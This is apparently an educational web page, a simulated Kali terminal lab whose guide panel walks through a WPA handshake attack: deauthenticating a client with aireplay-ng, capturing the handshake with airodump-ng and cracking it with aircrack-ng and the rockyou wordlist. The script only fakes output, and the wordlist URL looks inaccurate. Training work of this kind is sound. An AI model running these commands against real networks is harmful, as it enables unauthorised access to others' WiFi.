<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>WCC Cyber Lab: WiFi Cracking</title>
<style>
    /* --- RESET & BASIC STYLE --- */
    body {
        background-color: #0d1117;
        color: #00ff41;
        font-family: 'Courier New', Courier, monospace;
        margin: 0;
        padding: 0;
        height: 100vh;
        overflow: hidden;
    }

    /* --- LAYOUT --- */
    #main-wrapper {
        display: flex;
        flex-direction: column;
        height: 100%;
    }

    header {
        background: #161b22;
        padding: 10px;
        border-bottom: 1px solid #333;
        display: flex;
        justify-content: space-between;
        height: 40px;
        flex-shrink: 0;
    }

    /* --- TABS --- */
    .tab-bar { display: flex; gap: 5px; }
    
    .tab-btn {
        background: #21262d;
        color: #8b949e;
        padding: 8px 15px;
        border: 1px solid #333;
        border-bottom: none;
        cursor: pointer;
        border-radius: 5px 5px 0 0;
        font-weight: bold;
    }

    /* Active tab style */
    .tab-btn.active {
        background: #0d1117;
        color: #00ff41;
        border-top: 2px solid #00ff41;
    }

    /* --- TERMINAL VISIBILITY --- */
    /* CRITICAL FIX: Terminal 1 is visible by CSS default. No JS needed. */
    #term1 { display: flex; } 
    #term2 { display: none; }

    .terminal-window {
        flex-direction: column;
        flex-grow: 1;
        padding: 20px;
        overflow-y: auto;
        height: 100%;
    }

    /* --- CONTENT --- */
    .output-line { margin-bottom: 5px; white-space: pre-wrap; }
    .input-line { display: flex; margin-top: 10px; }
    .prompt { color: #00bfff; margin-right: 10px; font-weight: bold; }
    
    input {
        background: transparent;
        border: none;
        color: #00ff41;
        font-family: inherit;
        font-size: 16px;
        flex-grow: 1;
        outline: none;
    }

    /* --- GUIDE PANEL --- */
    #guide-panel {
        position: fixed;
        right: 0; top: 60px; bottom: 0;
        width: 350px;
        background: #161b22;
        border-left: 2px solid #00bfff;
        padding: 20px;
        overflow-y: auto;
        color: #ccc;
        display: none; /* Hidden by default, toggled by button */
        z-index: 999;
    }
    #guide-panel.visible { display: block; }

    .code-box { background: #000; padding: 5px; border: 1px solid #444; color: #a5d6ff; display: block; margin: 5px 0; font-family: monospace; }
    
    button { cursor: pointer; padding: 5px 10px; }
</style>
</head>
<body>

<div id="main-wrapper">
    <header>
        <div class="tab-bar">
            <div id="btn-1" class="tab-btn active" onclick="selectTab(1)">Terminal 1 (Capture)</div>
            <div id="btn-2" class="tab-btn" onclick="selectTab(2)">Terminal 2 (Attack)</div>
        </div>
        <div>
            <button onclick="location.reload()" style="background:#500; color:#fff; border:none;">Reset</button>
            <button onclick="toggleGuide()" style="background:#00bfff; border:none;">Lab Guide</button>
        </div>
    </header>

    <div id="term1" class="terminal-window">
        <div id="hist1">
            <div class="output-line" style="color:#e6e6e6">Kali GNU/Linux Rolling</div>
            <div class="output-line" style="color:#e6e6e6">Welcome. Open the Lab Guide to begin.</div>
            <div class="output-line" style="color:#666">----------------------------------------</div>
        </div>
        <div class="input-line">
            <span class="prompt">root@kali:~#</span>
            <input type="text" id="input1" autocomplete="off" autofocus>
        </div>
    </div>

    <div id="term2" class="terminal-window">
        <div id="hist2">
            <div class="output-line" style="color:#e6e6e6">Kali GNU/Linux Rolling</div>
            <div class="output-line" style="color:#e6e6e6">Terminal 2 - Attack Console</div>
            <div class="output-line" style="color:#666">----------------------------------------</div>
        </div>
        <div class="input-line">
            <span class="prompt">root@kali:~#</span>
            <input type="text" id="input2" autocomplete="off">
        </div>
    </div>
</div>

<div id="guide-panel" class="visible">
    <h2 style="color:#00bfff; margin-top:0;">WiFi Cracking Guide</h2>
    
    <p><b>1. Preparation</b><br>
    Stop services:<br>
    <span class="code-box">airmon-ng check kill</span>
    Enable Monitor Mode:<br>
    <span class="code-box">airmon-ng start wlan0</span>
    </p>

    <p><b>2. Recon</b><br>
    Scan for target:<br>
    <span class="code-box">airodump-ng wlan0mon</span>
    (Target: CyberLab_AP)
    </p>

    <p><b>3. Capture Handshake</b><br>
    Start listener (Terminal 1):<br>
    <span class="code-box">airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w ./test wlan0mon</span>
    <br>
    Switch to Terminal 2. Send DeAuth:<br>
    <span class="code-box">aireplay-ng -0 2 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon</span>
    </p>

    <p><b>4. Crack</b><br>
    Stop capture (Ctrl+C).<br>
    Download wordlist:<br>
    <span class="code-box">curl -L -o rockyou.txt https://github.com/rockyou.txt</span>
    Crack:<br>
    <span class="code-box">aircrack-ng test-01.cap -w rockyou.txt</span>
    </p>
    
    <button onclick="toggleGuide()" style="width:100%; margin-top:20px;">Close Guide</button>
</div>

<script>
    // Global State
    var state = {
        monitor: false,
        killed: false,
        runningScan: false,
        handshake: false,
        dl: false,
        tab: 1
    };

    var input1 = document.getElementById('input1');
    var input2 = document.getElementById('input2');

    // Focus input on load
    window.onload = function() {
        if(input1) input1.focus();
    };

    // Tab Switching
    function selectTab(n) {
        state.tab = n;
        document.getElementById('term1').style.display = (n===1) ? 'flex' : 'none';
        document.getElementById('term2').style.display = (n===2) ? 'flex' : 'none';
        
        document.getElementById('btn-1').className = (n===1) ? 'tab-btn active' : 'tab-btn';
        document.getElementById('btn-2').className = (n===2) ? 'tab-btn active' : 'tab-btn';
        
        if(n===1) input1.focus();
        if(n===2) input2.focus();
    }

    // Toggle Guide
    function toggleGuide() {
        var g = document.getElementById('guide-panel');
        if(g.style.display === 'none') {
            g.style.display = 'block';
        } else {
            g.style.display = 'none';
        }
    }

    // Input Handling
    input1.addEventListener('keydown', function(e) { checkKey(e, 1); });
    input2.addEventListener('keydown', function(e) { checkKey(e, 2); });

    function checkKey(e, tab) {
        if(e.key === 'Enter') {
            var val = (tab===1 ? input1 : input2).value.trim();
            (tab===1 ? input1 : input2).value = '';
            runCmd(val, tab);
        }
        if(e.key === 'c' && e.ctrlKey) {
            e.preventDefault();
            print(tab, '^C', 'warning');
            if(state.runningScan) {
                state.runningScan = false;
                if(state.handshake) {
                     print(tab, '[+] WPA Handshake written to test-01.cap', 'success');
                }
            }
        }
    }

    // Output Helper
    function print(tab, txt, type) {
        var div = document.createElement('div');
        div.className = 'output-line';
        if(type === 'success') div.style.color = '#00ff41';
        if(type === 'warning') div.style.color = '#ffeb3b';
        if(type === 'error') div.style.color = '#ff5555';
        if(!type) div.style.color = '#e6e6e6';
        
        div.innerText = txt;
        document.getElementById('hist'+tab).appendChild(div);
        
        var term = document.getElementById('term'+tab);
        term.scrollTop = term.scrollHeight;
    }

    // Logic Engine
    function runCmd(cmd, tab) {
        print(tab, 'root@kali:~# ' + cmd, 'info');
        
        if(!cmd) return;
        var parts = cmd.split(' ');
        var base = parts[0];

        if(base === 'clear') {
            document.getElementById('hist'+tab).innerHTML = '';
        }
        else if(base === 'ls') {
            var out = "Desktop  Downloads";
            if(state.handshake) out += "  test-01.cap";
            if(state.dl) out += "  rockyou.txt";
            print(tab, out, 'success');
        }
        else if(base === 'airmon-ng') {
            if(parts[1] === 'check') {
                state.killed = true;
                print(tab, 'Found 2 processes. Killing...', 'warning');
            } else if(parts[1] === 'start') {
                state.monitor = true;
                print(tab, '(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)', 'success');
            } else {
                print(tab, 'Usage: airmon-ng <start|check>', 'error');
            }
        }
        else if(base === 'airodump-ng') {
            if(!state.monitor) { print(tab, 'Error: Enable monitor mode first.', 'error'); return; }
            if(cmd.indexOf('-c') > -1) {
                // Targeted scan
                state.runningScan = true;
                print(tab, ' CH 6 ][ Elapsed: 12s ][ 2023-10-10 ][ WPA Handshake: ]', 'warning');
                print(tab, ' BSSID              ESSID', 'info');
                print(tab, ' 00:11:22:33:44:55  CyberLab_AP', 'success');
            } else {
                print(tab, 'Scanning all channels...', 'info');
                print(tab, ' 00:11:22:33:44:55  CyberLab_AP  (CH 6)', 'success');
            }
        }
        else if(base === 'aireplay-ng') {
            if(parts[1] !== '-0') { print(tab, 'Use deauth mode (-0).', 'error'); return; }
            print(tab, 'Sending DeAuth packets...', 'success');
            
            // Trigger handshake in Tab 1
            if(state.runningScan) {
                setTimeout(function(){
                    state.handshake = true;
                    var el = document.createElement('div');
                    el.innerText = '[ WPA HANDSHAKE: 00:11:22:33:44:55 ]';
                    el.style.backgroundColor = '#333';
                    el.style.color = '#00ff41';
                    el.className = 'output-line';
                    document.getElementById('hist1').appendChild(el);
                }, 1500);
            } else {
                print(tab, 'Warning: No listener running.', 'warning');
            }
        }
        else if(base === 'curl') {
            print(tab, 'Downloading rockyou.txt...', 'info');
            setTimeout(function(){ state.dl = true; print(tab, 'Download Complete.', 'success'); }, 1000);
        }
        else if(base === 'aircrack-ng') {
            if(!state.handshake) { print(tab, 'Error: No .cap file found.', 'error'); return; }
            print(tab, 'KEY FOUND! [ 12345678 ]', 'success');
        }
        else {
            print(tab, 'Command not found: ' + base, 'error');
        }
    }
</script>
</body>
</html>